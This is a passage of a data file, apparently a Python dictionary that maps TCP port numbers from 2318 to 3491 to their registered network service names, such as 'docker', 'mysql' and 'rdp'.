                                   2318: 'cadencecontrol', 2319: 'infolibria', 2320: 'siebel-ns', 2321: 'rdlap', 2322: 'ofsd', 2323: '3d-nfsd', 2324: 'cosmocall', 2325: 'ansysli', 2326: 'idcp',
                                   2327: 'xingcsm',
                                   2328: 'netrix-sftm',
                                   2329: 'nvd', 2330: 'tscchat', 2331: 'agentview', 2332: 'rcc-host', 2333: 'snapp', 2334: 'ace-client', 2335: 'ace-proxy', 2336: 'appleugcontrol', 2337: 'ideesrv',
                                   2338: 'norton-lambert',
                                   2339: '3com-webview', 2340: 'wrs_registry', 2341: 'xiostatus', 2342: 'manage-exec', 2343: 'nati-logos', 2344: 'fcmsys', 2345: 'dbm', 2346: 'redstorm_join',
                                   2347: 'redstorm_find',
                                   2348: 'redstorm_info', 2349: 'redstorm_diag', 2350: 'psbserver', 2351: 'psrserver', 2352: 'pslserver', 2353: 'pspserver', 2354: 'psprserver', 2355: 'psdbserver',
                                   2356: 'gxtelmd',
                                   2357: 'unihub-server', 2358: 'futrix', 2359: 'flukeserver', 2360: 'nexstorindltd', 2361: 'tl1', 2362: 'digiman', 2363: 'mediacntrlnfsd', 2364: 'oi-2000',
                                   2365: 'dbref', 2366: 'qip-login',
                                   2367: 'service-ctrl', 2368: 'opentable', 2370: 'l3-hbmon', 2371: 'worldwire', 2372: 'lanmessenger', 2373: 'remographlm', 2374: 'hydra', 2376: 'docker',
                                   2377: 'swarm', 2379: 'etcd-client',
                                   2380: 'etcd-server', 2381: 'compaq-https', 2382: 'ms-olap3', 2383: 'ms-olap4', 2384: 'sd-request', 2385: 'sd-data', 2386: 'virtualtape', 2387: 'vsamredirector',
                                   2388: 'mynahautostart',
                                   2389: 'ovsessionmgr', 2390: 'rsmtp', 2391: '3com-net-mgmt', 2392: 'tacticalauth', 2393: 'ms-olap1', 2394: 'ms-olap2', 2395: 'lan900_remote', 2396: 'wusage',
                                   2397: 'ncl', 2398: 'orbiter',
                                   2399: 'fmpro-fdal', 2400: 'opequus-server', 2401: 'cvspserver', 2403: 'taskmaster2000', 2404: 'iec-104', 2405: 'trc-netpoll', 2406: 'jediserver', 2407: 'orion',
                                   2408: 'optimanet',
                                   2409: 'sns-protocol', 2410: 'vrts-registry', 2411: 'netwave-ap-mgmt', 2412: 'cdn', 2413: 'orion-rmi-reg', 2414: 'beeyond', 2415: 'codima-rtp', 2416: 'rmtserver',
                                   2417: 'composit-server',
                                   2418: 'cas',
                                   2419: 'attachmate-s2s', 2420: 'dslremote-mgmt', 2421: 'g-talk', 2422: 'crmsbits', 2423: 'rnrp', 2424: 'kofax-svr', 2425: 'fjitsuappmgr', 2426: 'vcmp',
                                   2427: 'mgcp-gateway', 2428: 'ott',
                                   2429: 'ft-role', 2430: 'venus', 2431: 'venus-se', 2432: 'codasrv', 2433: 'codasrv-se', 2434: 'pxc-epmap', 2435: 'optilogic', 2436: 'topx', 2438: 'msp',
                                   2439: 'sybasedbsynch',
                                   2440: 'spearway',
                                   2441: 'pvsw-inet', 2442: 'netangel', 2443: 'powerclientcsf', 2444: 'btpp2sectrans', 2445: 'dtn1', 2446: 'bues_service', 2447: 'ovwdb', 2448: 'hpppssvr',
                                   2449: 'ratl', 2450: 'netadmin',
                                   2451: 'netchat', 2452: 'snifferclient', 2453: 'madge-ltd', 2454: 'indx-dds', 2455: 'wago-io-system', 2456: 'altav-remmgt', 2457: 'rapido-ip', 2458: 'griffin',
                                   2459: 'community',
                                   2460: 'ms-theater',
                                   2461: 'qadmifoper', 2462: 'qadmifevent', 2463: 'lsi-raid-mgmt', 2464: 'direcpc-si', 2465: 'lbm', 2466: 'lbf', 2467: 'high-criteria', 2468: 'qip-msgd',
                                   2469: 'mti-tcs-comm',
                                   2470: 'taskman-port',
                                   2471: 'seaodbc', 2472: 'c3', 2473: 'aker-cdp', 2474: 'vitalanalysis', 2475: 'ace-server', 2476: 'ace-svr-prop', 2477: 'ssm-cvs', 2478: 'ssm-cssps', 2479: 'ssm-els',
                                   2480: 'powerexchange',
                                   2481: 'giop', 2482: 'giop-ssl', 2483: 'ttc', 2484: 'ttc-ssl', 2485: 'netobjects1', 2486: 'netobjects2', 2487: 'pns', 2488: 'moy-corp', 2489: 'tsilb',
                                   2490: 'qip-qdhcp',
                                   2491: 'conclave-cpp',
                                   2492: 'groove', 2493: 'talarian-mqs', 2494: 'bmc-ar', 2495: 'fast-rem-serv', 2496: 'dirgis', 2497: 'quaddb', 2498: 'odn-castraq', 2499: 'unicontrol',
                                   2500: 'rtsserv', 2501: 'rtsclient',
                                   2502: 'kentrox-prot', 2503: 'nms-dpnss', 2504: 'wlbs', 2505: 'ppcontrol', 2506: 'jbroker', 2507: 'spock', 2508: 'jdatastore', 2509: 'fjmpss', 2510: 'fjappmgrbulk',
                                   2511: 'metastorm',
                                   2512: 'citrixima', 2513: 'citrixadmin', 2514: 'facsys-ntp', 2515: 'facsys-router', 2516: 'maincontrol', 2517: 'call-sig-trans', 2518: 'willy', 2519: 'globmsgsvc',
                                   2520: 'pvsw',
                                   2521: 'adaptecmgr',
                                   2522: 'windb', 2523: 'qke-llc-v3', 2524: 'optiwave-lm', 2525: 'ms-v-worlds', 2526: 'ema-sent-lm', 2527: 'iqserver', 2528: 'ncr_ccl', 2529: 'utsftp',
                                   2530: 'vrcommerce', 2531: 'ito-e-gui',
                                   2532: 'ovtopmd', 2533: 'snifferserver', 2534: 'combox-web-acc', 2535: 'madcap', 2536: 'btpp2audctr1', 2537: 'upgrade', 2538: 'vnwk-prapi', 2539: 'vsiadmin',
                                   2540: 'lonworks',
                                   2541: 'lonworks2',
                                   2542: 'udrawgraph', 2543: 'reftek', 2544: 'novell-zen', 2545: 'sis-emt', 2546: 'vytalvaultbrtp', 2547: 'vytalvaultvsmp', 2548: 'vytalvaultpipe', 2549: 'ipass',
                                   2550: 'ads',
                                   2551: 'isg-uda-server',
                                   2552: 'call-logging', 2553: 'efidiningport', 2554: 'vcnet-link-v10', 2555: 'compaq-wcp', 2556: 'nicetec-nmsvc', 2557: 'nicetec-mgmt', 2558: 'pclemultimedia',
                                   2559: 'lstp', 2560: 'labrat',
                                   2561: 'mosaixcc', 2562: 'delibo', 2563: 'cti-redwood', 2564: 'hp-3000-telnet', 2565: 'coord-svr', 2566: 'pcs-pcw', 2567: 'clp', 2568: 'spamtrap',
                                   2569: 'sonuscallsig', 2570: 'hs-port',
                                   2571: 'cecsvc', 2572: 'ibp', 2573: 'trustestablish', 2574: 'blockade-bpsp', 2575: 'hl7', 2576: 'tclprodebugger', 2577: 'scipticslsrvr', 2578: 'rvs-isdn-dcp',
                                   2579: 'mpfoncl',
                                   2580: 'tributary',
                                   2581: 'argis-te', 2582: 'argis-ds', 2584: 'cyaserv', 2585: 'netx-server', 2586: 'netx-agent', 2587: 'masc', 2588: 'privilege', 2589: 'quartus-tcl', 2590: 'idotdist',
                                   2591: 'maytagshuffle',
                                   2592: 'netrek', 2593: 'mns-mail', 2594: 'dts', 2595: 'worldfusion1', 2596: 'worldfusion2', 2597: 'homesteadglory', 2598: 'citriximaclient', 2599: 'snapd',
                                   2600: 'zebrasrv', 2601: 'zebra',
                                   2602: 'ripd', 2603: 'ripngd', 2604: 'ospfd', 2605: 'bgpd', 2606: 'netmon', 2607: 'connection', 2608: 'wag-service', 2609: 'system-monitor', 2610: 'versa-tek',
                                   2611: 'lionhead',
                                   2612: 'qpasa-agent',
                                   2613: 'smntubootstrap', 2614: 'neveroffline', 2615: 'firepower', 2616: 'appswitch-emp', 2617: 'cmadmin', 2618: 'priority-e-com', 2619: 'bruce',
                                   2620: 'lpsrecommender', 2621: 'miles-apart',
                                   2622: 'metricadbc', 2623: 'lmdp', 2624: 'aria', 2625: 'blwnkl-port', 2626: 'gbjd816', 2627: 'webster', 2628: 'dict', 2629: 'sitaraserver', 2630: 'sitaramgmt',
                                   2631: 'sitaradir',
                                   2632: 'irdg-post',
                                   2633: 'interintelli', 2634: 'pk-electronics', 2635: 'backburner', 2636: 'solve', 2637: 'imdocsvc', 2638: 'sybase', 2639: 'aminet', 2640: 'sai_sentlm',
                                   2641: 'hdl-srv', 2642: 'tragic',
                                   2643: 'gte-samp', 2644: 'travsoft-ipx-t', 2645: 'novell-ipx-cmd', 2646: 'and-lm', 2647: 'syncserver', 2648: 'upsnotifyprot', 2649: 'vpsipport', 2650: 'eristwoguns',
                                   2651: 'ebinsite',
                                   2652: 'interpathpanel', 2653: 'sonus', 2654: 'corel_vncadmin', 2655: 'unglue', 2656: 'kana', 2657: 'sns-dispatcher', 2658: 'sns-admin', 2659: 'sns-query',
                                   2660: 'gcmonitor',
                                   2661: 'olhost',
                                   2662: 'bintec-capi', 2663: 'bintec-tapi', 2664: 'patrol-mq-gm', 2665: 'patrol-mq-nm', 2666: 'extensis', 2667: 'alarm-clock-s', 2668: 'alarm-clock-c', 2669: 'toad',
                                   2670: 'tve-announce',
                                   2671: 'newlixreg', 2672: 'nhserver', 2673: 'firstcall42', 2674: 'ewnn', 2675: 'ttc-etap', 2676: 'simslink', 2677: 'gadgetgate1way', 2678: 'gadgetgate2way',
                                   2679: 'syncserverssl',
                                   2680: 'pxc-sapxom',
                                   2681: 'mpnjsomb', 2683: 'ncdloadbalance', 2684: 'mpnjsosv', 2685: 'mpnjsocl', 2686: 'mpnjsomg', 2687: 'pq-lic-mgmt', 2688: 'md-cg-http', 2689: 'fastlynx',
                                   2690: 'hp-nnm-data',
                                   2691: 'itinternet',
                                   2692: 'admins-lms', 2694: 'pwrsevent', 2695: 'vspread', 2696: 'unifyadmin', 2697: 'oce-snmp-trap', 2698: 'mck-ivpip', 2699: 'csoft-plusclnt', 2700: 'tqdata',
                                   2701: 'sms-rcinfo',
                                   2702: 'sms-xfer',
                                   2703: 'sms-chat', 2704: 'sms-remctrl', 2705: 'sds-admin', 2706: 'ncdmirroring', 2707: 'emcsymapiport', 2708: 'banyan-net', 2709: 'supermon', 2710: 'sso-service',
                                   2711: 'sso-control',
                                   2712: 'aocp',
                                   2713: 'raventbs', 2714: 'raventdm', 2715: 'hpstgmgr2', 2716: 'inova-ip-disco', 2717: 'pn-requester', 2718: 'pn-requester2', 2719: 'scan-change', 2720: 'wkars',
                                   2721: 'smart-diagnose',
                                   2722: 'proactivesrvr', 2723: 'watchdog-nt', 2724: 'qotps', 2725: 'msolap-ptp2', 2726: 'tams', 2727: 'mgcp-callagent', 2728: 'sqdr', 2729: 'tcim-control',
                                   2730: 'nec-raidplus',
                                   2731: 'fyre-messanger',
                                   2732: 'g5m', 2733: 'signet-ctf', 2734: 'ccs-software', 2735: 'netiq-mc', 2736: 'radwiz-nms-srv', 2737: 'srp-feedback', 2738: 'ndl-tcp-ois-gw', 2739: 'tn-timing',
                                   2740: 'alarm',
                                   2741: 'tsb',
                                   2742: 'tsb2', 2743: 'murx', 2744: 'honyaku', 2745: 'urbisnet', 2746: 'cpudpencap', 2747: 'fjippol-swrly', 2748: 'fjippol-polsvr', 2749: 'fjippol-cnsl',
                                   2750: 'fjippol-port1',
                                   2751: 'fjippol-port2',
                                   2752: 'rsisysaccess', 2753: 'de-spot', 2754: 'apollo-cc', 2755: 'expresspay', 2756: 'simplement-tie', 2757: 'cnrp', 2758: 'apollo-status', 2759: 'apollo-gms',
                                   2760: 'sabams',
                                   2761: 'dicom-iscl',
                                   2762: 'dicom-tls', 2763: 'desktop-dna', 2764: 'data-insurance', 2765: 'qip-audup', 2766: 'listen', 2767: 'uadtc', 2768: 'uacs', 2769: 'exce', 2770: 'veronica',
                                   2771: 'vergencecm',
                                   2772: 'auris',
                                   2773: 'rbakcup1', 2774: 'rbakcup2', 2775: 'smpp', 2776: 'ridgeway1', 2777: 'ridgeway2', 2778: 'gwen-sonya', 2779: 'lbc-sync', 2780: 'lbc-control', 2781: 'whosells',
                                   2782: 'everydayrc',
                                   2783: 'aises',
                                   2784: 'www-dev', 2785: 'aic-np', 2786: 'aic-oncrpc', 2787: 'piccolo', 2788: 'fryeserv', 2789: 'media-agent', 2790: 'plgproxy', 2791: 'mtport-regist',
                                   2792: 'f5-globalsite',
                                   2793: 'initlsmsad',
                                   2795: 'livestats', 2796: 'ac-tech', 2797: 'esp-encap', 2798: 'tmesis-upshot', 2799: 'icon-discover', 2800: 'acc-raid', 2801: 'igcp', 2802: 'veritas-tcp1',
                                   2803: 'btprjctrl',
                                   2804: 'dvr-esm',
                                   2805: 'wta-wsp-s', 2806: 'cspuni', 2807: 'cspmulti', 2808: 'j-lan-p', 2809: 'corbaloc', 2810: 'netsteward', 2811: 'gsiftp', 2812: 'atmtcp', 2813: 'llm-pass',
                                   2814: 'llm-csv',
                                   2815: 'lbc-measure',
                                   2816: 'lbc-watchdog', 2818: 'rmlnk', 2819: 'fc-faultnotify', 2820: 'univision', 2821: 'vrts-at-port', 2822: 'ka0wuc', 2823: 'cqg-netlan', 2824: 'cqg-netlan-1',
                                   2826: 'slc-systemlog',
                                   2827: 'slc-ctrlrloops', 2828: 'itm-lm', 2829: 'silkp1', 2830: 'silkp2', 2831: 'silkp3', 2832: 'silkp4', 2833: 'glishd', 2834: 'evtp', 2835: 'evtp-data',
                                   2836: 'catalyst', 2837: 'repliweb',
                                   2838: 'starbot', 2839: 'nmsigport', 2840: 'l3-exprt', 2841: 'l3-ranger', 2842: 'l3-hawk', 2843: 'pdnet', 2844: 'bpcp-poll', 2845: 'bpcp-trap', 2846: 'aimpp-hello',
                                   2847: 'aimpp-port-req',
                                   2848: 'amt-blc-port', 2849: 'fxp', 2850: 'metaconsole', 2851: 'webemshttp', 2852: 'bears-01', 2853: 'ispipes', 2854: 'infomover', 2855: 'msrp', 2856: 'cesdinv',
                                   2857: 'simctlp',
                                   2858: 'ecnp',
                                   2859: 'activememory', 2860: 'dialpad-voice1', 2861: 'dialpad-voice2', 2862: 'ttg-protocol', 2863: 'sonardata', 2864: 'astromed-main', 2865: 'pit-vpn',
                                   2866: 'iwlistener',
                                   2867: 'esps-portal',
                                   2868: 'npep-messaging', 2869: 'icslap', 2870: 'daishi', 2871: 'msi-selectplay', 2872: 'radix', 2874: 'dxmessagebase1', 2875: 'dxmessagebase2', 2876: 'sps-tunnel',
                                   2877: 'bluelance',
                                   2878: 'aap',
                                   2879: 'ucentric-ds', 2880: 'synapse', 2881: 'ndsp', 2882: 'ndtp', 2883: 'ndnp', 2884: 'flashmsg', 2885: 'topflow', 2886: 'responselogic', 2887: 'aironetddp',
                                   2888: 'spcsdlobby',
                                   2889: 'rsom',
                                   2890: 'cspclmulti', 2891: 'cinegrfx-elmd', 2892: 'snifferdata', 2893: 'vseconnector', 2894: 'abacus-remote', 2895: 'natuslink', 2896: 'ecovisiong6-1',
                                   2897: 'citrix-rtmp',
                                   2898: 'appliance-cfg',
                                   2899: 'powergemplus', 2900: 'quicksuite', 2901: 'allstorcns', 2902: 'netaspi', 2903: 'extensisportfolio', 2904: 'm2ua', 2905: 'm3ua', 2906: 'caller9',
                                   2907: 'webmethods-b2b', 2908: 'mao',
                                   2909: 'funk-dialout', 2910: 'tdaccess', 2911: 'blockade', 2912: 'epicon', 2913: 'boosterware', 2914: 'gamelobby', 2915: 'tksocket', 2916: 'elvin_server',
                                   2917: 'elvin_client',
                                   2918: 'kastenchasepad',
                                   2919: 'roboer', 2920: 'roboeda', 2921: 'cesdcdman', 2922: 'cesdcdtrn', 2923: 'wta-wsp-wtp-s', 2924: 'precise-vip', 2926: 'mobile-file-dl', 2927: 'unimobilectrl',
                                   2928: 'redstone-cpss',
                                   2929: 'amx-webadmin', 2930: 'amx-weblinx', 2931: 'circle-x', 2932: 'incp', 2933: '4-tieropmgw', 2934: '4-tieropmcli', 2935: 'qtp', 2936: 'otpatch',
                                   2937: 'pnaconsult-lm', 2938: 'sm-pas-1',
                                   2939: 'sm-pas-2', 2940: 'sm-pas-3', 2941: 'sm-pas-4', 2942: 'sm-pas-5', 2943: 'ttnrepository', 2944: 'megaco-h248', 2945: 'h248-binary', 2946: 'fjsvmpor',
                                   2947: 'gpsd', 2948: 'wap-push',
                                   2949: 'wap-pushsecure', 2950: 'esip', 2951: 'ottp', 2952: 'mpfwsas', 2953: 'ovalarmsrv', 2954: 'ovalarmsrv-cmd', 2955: 'csnotify', 2956: 'ovrimosdbman',
                                   2957: 'jmact5', 2958: 'jmact6',
                                   2959: 'rmopagt', 2960: 'dfoxserver', 2961: 'boldsoft-lm', 2962: 'iph-policy-cli', 2963: 'iph-policy-adm', 2964: 'bullant-srap', 2965: 'bullant-rap',
                                   2966: 'idp-infotrieve',
                                   2967: 'symantec-av',
                                   2968: 'enpp', 2969: 'essp', 2970: 'index-net', 2971: 'netclip', 2972: 'pmsm-webrctl', 2973: 'svnetworks', 2974: 'signal', 2975: 'fjmpcm', 2976: 'cns-srv-port',
                                   2977: 'ttc-etap-ns',
                                   2978: 'ttc-etap-ds', 2979: 'h263-video', 2980: 'wimd', 2981: 'mylxamport', 2982: 'iwb-whiteboard', 2983: 'netplan', 2984: 'hpidsadmin', 2985: 'hpidsagent',
                                   2986: 'stonefalls',
                                   2987: 'identify',
                                   2988: 'hippad', 2989: 'zarkov', 2990: 'boscap', 2991: 'wkstn-mon', 2992: 'avenyo', 2993: 'veritas-vis1', 2994: 'veritas-vis2', 2995: 'idrs', 2996: 'vsixml',
                                   2997: 'rebol',
                                   2998: 'iss-realsec',
                                   2999: 'remoteware-un', 3000: 'ppp', 3001: 'nessus', 3002: 'exlm-agent', 3003: 'cgms', 3004: 'csoftragent', 3005: 'deslogin', 3006: 'deslogind', 3007: 'lotusmtap',
                                   3008: 'midnight-tech',
                                   3009: 'pxc-ntfy', 3010: 'gw', 3011: 'trusted-web', 3012: 'twsdss', 3013: 'gilatskysurfer', 3014: 'broker_service', 3015: 'nati-dstp', 3016: 'notify_srvr',
                                   3017: 'event_listener',
                                   3018: 'srvc_registry', 3019: 'resource_mgr', 3020: 'cifs', 3021: 'agriserver', 3022: 'csregagent', 3023: 'magicnotes', 3024: 'nds_sso', 3026: 'agri-gateway',
                                   3027: 'LiebDevMgmt_C',
                                   3028: 'LiebDevMgmt_DM', 3029: 'LiebDevMgmt_A', 3030: 'arepa-cas', 3031: 'eppc', 3032: 'redwood-chat', 3033: 'pdb', 3034: 'osmosis-aeea', 3035: 'fjsv-gssagt',
                                   3036: 'hagel-dump',
                                   3037: 'hp-san-mgmt',
                                   3038: 'santak-ups', 3039: 'cogitate', 3040: 'tomato-springs', 3041: 'di-traceware', 3042: 'journee', 3043: 'brp', 3044: 'epp', 3046: 'di-ase', 3047: 'hlserver',
                                   3048: 'pctrader',
                                   3050: 'gds_db',
                                   3051: 'galaxy-server', 3052: 'powerchute', 3053: 'dsom-server', 3054: 'amt-cnf-prot', 3055: 'policyserver', 3056: 'cdl-server', 3057: 'goahead-fldup',
                                   3058: 'videobeans', 3059: 'qsoft',
                                   3060: 'interserver', 3061: 'cautcpd', 3062: 'ncacn-ip-tcp', 3063: 'ncadg-ip-udp', 3064: 'dnet-tstproxy', 3065: 'slinterbase', 3066: 'netattachsdmp', 3067: 'fjhpjp',
                                   3068: 'ls3bcast',
                                   3069: 'ls3',
                                   3070: 'mgxswitch', 3071: 'csd-mgmt-port', 3072: 'csd-monitor', 3073: 'vcrp', 3074: 'xbox', 3075: 'orbix-locator', 3076: 'orbix-config', 3077: 'orbix-loc-ssl',
                                   3078: 'orbix-cfg-ssl',
                                   3079: 'lv-frontpanel', 3080: 'stm_pproc', 3081: 'tl1-lv', 3082: 'tl1-raw', 3083: 'tl1-telnet', 3084: 'itm-mccs', 3085: 'pcihreq', 3086: 'sj3', 3087: 'asoki-sma',
                                   3088: 'xdtp',
                                   3089: 'ptk-alink',
                                   3090: 'stss', 3091: '1ci-smcs', 3093: 'rapidmq-center', 3094: 'rapidmq-reg', 3095: 'panasas', 3096: 'ndl-aps', 3098: 'umm-port', 3099: 'chmd', 3100: 'opcon-xps',
                                   3101: 'hp-pxpib',
                                   3102: 'slslavemon',
                                   3103: 'autocuesmi', 3104: 'autocuelog', 3105: 'cardbox', 3106: 'cardbox-http', 3107: 'business', 3108: 'geolocate', 3109: 'personnel', 3110: 'sim-control',
                                   3111: 'wsynch',
                                   3112: 'ksysguard',
                                   3113: 'cs-auth-svr', 3114: 'ccmad', 3115: 'mctet-master', 3116: 'mctet-gateway', 3117: 'mctet-jserv', 3118: 'pkagent', 3119: 'd2000kernel', 3120: 'd2000webserver',
                                   3121: 'pcmk-remote',
                                   3122: 'vtr-emulator', 3123: 'edix', 3124: 'beacon-port', 3125: 'a13-an', 3127: 'ctx-bridge', 3128: 'squid-http', 3129: 'netport-id', 3130: 'icpv2',
                                   3131: 'netbookmark',
                                   3132: 'ms-rule-engine',
                                   3133: 'prism-deploy', 3134: 'ecp', 3135: 'peerbook-port', 3136: 'grubd', 3137: 'rtnt-1', 3138: 'rtnt-2', 3139: 'incognitorv', 3140: 'ariliamulti', 3141: 'vmodem',
                                   3142: 'apt-cacher',
                                   3143: 'seaview',
                                   3144: 'tarantella', 3145: 'csi-lfap', 3146: 'bears-02', 3147: 'rfio', 3148: 'nm-game-admin', 3149: 'nm-game-server', 3150: 'nm-asses-admin', 3151: 'nm-assessor',
                                   3152: 'feitianrockey',
                                   3153: 's8-client-port', 3154: 'ccmrmi', 3155: 'jpegmpeg', 3156: 'indura', 3157: 'e3consultants', 3158: 'stvp', 3159: 'navegaweb-port', 3160: 'tip-app-server',
                                   3161: 'doc1lm', 3162: 'sflm',
                                   3163: 'res-sap', 3164: 'imprs', 3165: 'newgenpay', 3166: 'sossecollector', 3167: 'nowcontact', 3168: 'poweronnud', 3169: 'serverview-as', 3170: 'serverview-asn',
                                   3171: 'serverview-gf',
                                   3172: 'serverview-rm', 3173: 'serverview-icc', 3174: 'armi-server', 3175: 't1-e1-over-ip', 3176: 'ars-master', 3177: 'phonex-port', 3178: 'radclientport',
                                   3179: 'h2gf-w-2m',
                                   3180: 'mc-brk-srv',
                                   3181: 'bmcpatrolagent', 3182: 'bmcpatrolrnvu', 3183: 'cops-tls', 3184: 'apogeex-port', 3185: 'smpppd', 3186: 'iiw-port', 3187: 'odi-port', 3188: 'brcm-comm-port',
                                   3189: 'pcle-infex',
                                   3190: 'csvr-proxy', 3191: 'csvr-sslproxy', 3192: 'firemonrcc', 3193: 'spandataport', 3194: 'magbind', 3195: 'ncu-1', 3196: 'ncu-2', 3197: 'embrace-dp-s',
                                   3198: 'embrace-dp-c',
                                   3199: 'dmod-workspace',
                                   3200: 'tick-port', 3201: 'cpq-tasksmart', 3202: 'intraintra', 3203: 'netwatcher-mon', 3204: 'netwatcher-db', 3205: 'isns', 3206: 'ironmail', 3207: 'vx-auth-port',
                                   3208: 'pfu-prcallback',
                                   3209: 'netwkpathengine', 3210: 'flamenco-proxy', 3211: 'avsecuremgmt', 3212: 'surveyinst', 3213: 'neon24x7', 3214: 'jmq-daemon-1', 3215: 'jmq-daemon-2',
                                   3216: 'ferrari-foam',
                                   3217: 'unite',
                                   3218: 'smartpackets', 3219: 'wms-messenger', 3220: 'xnm-ssl', 3221: 'xnm-clear-text', 3222: 'glbp', 3223: 'digivote', 3224: 'aes-discovery', 3225: 'fcip-port',
                                   3226: 'isi-irp',
                                   3227: 'dwnmshttp',
                                   3228: 'dwmsgserver', 3229: 'global-cd-port', 3230: 'sftdst-port', 3231: 'vidigo', 3232: 'mdtp', 3233: 'whisker', 3234: 'alchemy', 3235: 'mdap-port',
                                   3236: 'apparenet-ts',
                                   3237: 'apparenet-tps',
                                   3238: 'apparenet-as', 3239: 'apparenet-ui', 3240: 'triomotion', 3241: 'sysorb', 3242: 'sdp-id-port', 3243: 'timelot', 3244: 'onesaf', 3245: 'vieo-fe',
                                   3246: 'dvt-system', 3247: 'dvt-data',
                                   3248: 'procos-lm', 3249: 'ssp', 3250: 'hicp', 3251: 'sysscanner', 3252: 'dhe', 3253: 'pda-data', 3254: 'pda-sys', 3255: 'semaphore', 3256: 'cpqrpm-agent',
                                   3257: 'cpqrpm-server',
                                   3258: 'ivecon-port',
                                   3259: 'epncdp2', 3260: 'iscsi', 3261: 'winshadow', 3262: 'necp', 3263: 'ecolor-imager', 3264: 'ccmail', 3265: 'altav-tunnel', 3266: 'ns-cfg-server',
                                   3267: 'ibm-dial-out',
                                   3268: 'globalcatLDAP',
                                   3269: 'globalcatLDAPssl', 3270: 'verismart', 3271: 'csoft-prev', 3272: 'user-manager', 3273: 'sxmp', 3274: 'ordinox-server', 3275: 'samd', 3276: 'maxim-asics',
                                   3277: 'awg-proxy',
                                   3278: 'lkcmserver',
                                   3280: 'vs-server', 3281: 'sysopt', 3282: 'datusorb', 3283: 'netassistant', 3284: '4talk', 3285: 'plato', 3286: 'e-net', 3287: 'directvdata', 3288: 'cops',
                                   3289: 'enpc', 3290: 'caps-lm',
                                   3291: 'sah-lm', 3292: 'meetingmaker', 3293: 'fg-fps', 3294: 'fg-gip', 3295: 'dyniplookup', 3296: 'rib-slm', 3297: 'cytel-lm', 3298: 'deskview', 3299: 'saprouter',
                                   3300: 'ceph',
                                   3302: 'mcs-fastmail',
                                   3303: 'opsession-clnt', 3304: 'opsession-srvr', 3305: 'odette-ftp', 3306: 'mysql', 3307: 'opsession-prxy', 3308: 'tns-server', 3309: 'tns-adv', 3310: 'dyna-access',
                                   3311: 'mcns-tel-ret',
                                   3312: 'appman-server', 3313: 'uorb', 3314: 'uohost', 3315: 'cdid', 3316: 'aicc-cmi', 3317: 'vsaiport', 3318: 'ssrip', 3319: 'sdt-lmd', 3320: 'officelink2000',
                                   3321: 'vnsstr',
                                   3325: 'active-net',
                                   3326: 'sftu', 3327: 'bbars', 3328: 'egptlm', 3329: 'hp-device-disc', 3330: 'mcs-calypsoicf', 3331: 'mcs-messaging', 3332: 'mcs-mailsvr', 3333: 'dec-notes',
                                   3334: 'directv-web',
                                   3335: 'directv-soft',
                                   3336: 'directv-tick', 3337: 'directv-catlg', 3338: 'anet-b', 3339: 'anet-l', 3340: 'anet-m', 3341: 'anet-h', 3342: 'webtie', 3343: 'ms-cluster-net',
                                   3344: 'bnt-manager', 3345: 'influence',
                                   3346: 'trnsprntproxy', 3347: 'phoenix-rpc', 3348: 'pangolin-laser', 3349: 'chevinservices', 3350: 'findviatv', 3351: 'btrieve', 3352: 'ssql', 3353: 'fatpipe',
                                   3354: 'suitjd',
                                   3355: 'ordinox-dbase',
                                   3356: 'upnotifyps', 3357: 'adtech-test', 3358: 'mpsysrmsvr', 3359: 'wg-netforce', 3360: 'kv-server', 3361: 'kv-agent', 3362: 'dj-ilm', 3363: 'nati-vi-server',
                                   3364: 'creativeserver',
                                   3365: 'contentserver', 3366: 'creativepartnr', 3371: 'satvid-datalnk', 3372: 'msdtc', 3373: 'lavenir-lm', 3374: 'cluster-disc', 3375: 'vsnm-agent', 3376: 'cdbroker',
                                   3377: 'cogsys-lm',
                                   3378: 'wsicopy', 3379: 'socorfs', 3380: 'sns-channels', 3381: 'geneous', 3382: 'fujitsu-neat', 3383: 'esp-lm', 3384: 'hp-clic', 3385: 'qnxnetman', 3386: 'gprs-data',
                                   3387: 'backroomnet',
                                   3388: 'cbserver', 3389: 'rdp', 3390: 'dsc', 3391: 'savant', 3392: 'efi-lm', 3393: 'd2k-tapestry1', 3394: 'd2k-tapestry2', 3395: 'dyna-lm', 3396: 'printer_agent',
                                   3397: 'saposs',
                                   3398: 'sapcomm',
                                   3399: 'sapeps', 3400: 'csms2', 3401: 'filecast', 3402: 'fxaengine-net', 3405: 'nokia-ann-ch1', 3406: 'nokia-ann-ch2', 3407: 'ldap-admin', 3408: 'BESApi',
                                   3409: 'networklens',
                                   3410: 'networklenss',
                                   3411: 'biolink-auth', 3412: 'xmlblaster', 3413: 'svnet', 3414: 'wip-port', 3415: 'bcinameservice', 3416: 'commandport', 3417: 'csvr', 3418: 'rnmap',
                                   3419: 'softaudit', 3420: 'ifcp-port',
                                   3421: 'bmap', 3422: 'rusb-sys-port', 3423: 'xtrm', 3424: 'xtrms', 3425: 'agps-port', 3426: 'arkivio', 3427: 'websphere-snmp', 3428: 'twcss', 3429: 'gcsp',
                                   3430: 'ssdispatch',
                                   3431: 'ndl-als',
                                   3432: 'osdcp', 3433: 'alta-smp', 3434: 'opencm', 3435: 'pacom', 3436: 'gc-config', 3437: 'autocueds', 3438: 'spiral-admin', 3439: 'hri-port', 3440: 'ans-console',
                                   3441: 'connect-client',
                                   3442: 'connect-server', 3443: 'ov-nnm-websrv', 3444: 'denali-server', 3445: 'monp', 3446: '3comfaxrpc', 3447: 'directnet', 3448: 'dnc-port', 3449: 'hotu-chat',
                                   3450: 'castorproxy',
                                   3451: 'asam',
                                   3452: 'sabp-signal', 3453: 'pscupd', 3454: 'mira', 3455: 'prsvp', 3456: 'vat', 3457: 'vat-control', 3458: 'd3winosfi', 3459: 'integral', 3460: 'edm-manager',
                                   3461: 'edm-stager',
                                   3462: 'track',
                                   3463: 'edm-adm-notify', 3464: 'edm-mgr-sync', 3465: 'edm-mgr-cntrl', 3466: 'workflow', 3467: 'rcst', 3468: 'ttcmremotectrl', 3469: 'pluribus', 3470: 'jt400',
                                   3471: 'jt400-ssl',
                                   3472: 'jaugsremotec-1', 3473: 'jaugsremotec-2', 3474: 'ttntspauto', 3475: 'genisar-port', 3476: 'nppmp', 3477: 'ecomm', 3478: 'stun', 3479: 'twrpc',
                                   3480: 'plethora',
                                   3481: 'cleanerliverc',
                                   3482: 'vulture', 3483: 'slim-devices', 3484: 'gbs-stp', 3485: 'celatalk', 3486: 'ifsf-hb-port', 3487: 'ltctcp', 3488: 'fs-rh-srv', 3489: 'dtp-dia', 3490: 'colubris',
                                   3491: 'swr-port',
